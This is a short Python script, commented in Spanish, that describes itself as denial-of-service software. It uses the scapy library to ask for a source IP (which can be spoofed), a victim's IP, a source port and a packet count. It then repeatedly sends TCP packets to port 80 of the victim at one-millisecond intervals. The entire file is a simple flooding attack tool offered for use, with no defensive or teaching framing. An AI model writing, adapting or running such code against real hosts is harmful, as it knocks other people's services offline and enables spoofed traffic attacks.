# En esta aplicacion se hara un software de denegacion de servicio con la libreria scapy de python
# Primero se instala scapy con el siguiente comando "pip install scapy"
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP

# Se solicita los datos de la victima
Ip_origen = input("Por favor ingrese la IP Origen: ")
Ip_destino = input("Por favor ingrese la IP Destino: ")
puerto = int(input("Por favor ingrese el puerto de origen: "))

# Se crea el indice del contador del while y se pide la cantidad de paquetes que se envian
i = 1
paquetes = int(input("Por favor ingresen cuantos paquetes va a enviar: "))

# Se crea el while que automatiza el envio de paquetes a la ip de la victima por el puerto de la victima
while i <= paquetes:
    IP_info = IP(src=Ip_origen, dst=Ip_destino)
    TCP_info = TCP(sport=puerto, dport=80)
    Pqte = IP_info / TCP_info
    send(Pqte, inter=.001)
    print("Enviado [", paquetes, "] Paquetes")
    i+=1



    










